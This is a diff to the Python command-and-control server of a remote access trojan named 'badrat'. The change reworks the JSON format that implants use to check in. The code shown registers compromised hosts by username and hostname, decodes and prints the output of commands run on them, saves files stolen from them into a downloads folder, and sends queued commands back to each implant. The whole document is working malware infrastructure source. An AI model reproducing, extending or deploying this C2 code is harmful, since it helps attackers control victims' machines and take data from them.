@@ -483,20 +483,20 @@ def serve_server(port=8080):
         # We are dealing with normal rat comms
         # Parse POST parameters into JSON string then into python dict
         post_json = request.get_json(force=True)
+        if(verbose):
+            pretty_print("[v] rat  sent data: " + str(post_json))
         post_dict = dict(post_json)
         try:
-            ratID = str(post_dict['id'])
-            ratType = str(post_dict['type'])
-            username = str(post_dict['un'])
-            hostname = str(post_dict['hn'])
+            package = post_dict['p'][0]
+            ratID = str(package['id'])
+            ratType = str(package['type'])
+            username = str(package['un'])
+            hostname = str(package['hn'])
             if(ratType not in supported_types):
                 ratType = "?"
         except:
             pretty_print("\n[!] Failed to grab id, type, username, or hostname param from POST request")
             return(default_page())
-
-        if(verbose):
-            pretty_print("[v] rat " + colors(ratID) + " sent data: " + str(post_json))
 
         # Update checkin time for an agent every checkin
         checkin = datetime.now().strftime("%H:%M:%S")
@@ -512,22 +512,25 @@ def serve_server(port=8080):
             comp.add_tab_item(ratID)
             pretty_print("[*] (" + datetime.now().strftime("%H:%M:%S, %b %d") + ") New rat checked in: " + colors(ratID))
 
-        if("retval" in post_dict.keys()):
+        if("retval" in package.keys()):
             commands[ratID] = ""
-            pretty_print("[*] Results from rat " + colors(str(post_dict['id'])) + ":\n")
-            pretty_print('\033[1;97m' + base64.b64decode(post_dict['retval']).decode('utf-8') + '\033[0m')
+            pretty_print("[*] Results from rat " + colors(str(package['id'])) + ":\n")
+            pretty_print('\033[1;97m' + base64.b64decode(package['retval']).decode('utf-8') + '\033[0m')
 
-        if("dl" in post_dict.keys()):
+        if("dl" in package.keys()):
             commands[ratID] = "" # Reset command back to "" (blank) after we finish processing the results
             rand = ''.join(random.choice(alpha) for choice in range(10)) 
             with open(Path("downloads/" + ratID + "." + rand).resolve() , "wb") as fd:
-                fd.write(base64.b64decode(post_dict['dl']))
+                fd.write(base64.b64decode(package['dl']))
             pretty_print("\n[*] File download from rat " + colors(ratID) + " saved to " + colors("downloads/" + colors(ratID)) + colors("." + rand))
 
         # Reset the command on deck to blank after sending the command (so we don't get repeated executions of the same command)
         cmnd = commands[ratID]
         commands[ratID] = ""
-        return(htmlify(json.dumps({"cmnd": cmnd})))
+        json_data = json.dumps( {"p": [ {"id": ratID, "cmnd": cmnd} ] } )
+        if(verbose):
+            pretty_print("[v] Server sends data to rat " + colors(ratID) + ": " + json_data)
+        return(htmlify(json_data))
 
     if(verbose):
         pretty_print("[v] Starting badrat in verbose mode. Prepare to have your screen flooded.")
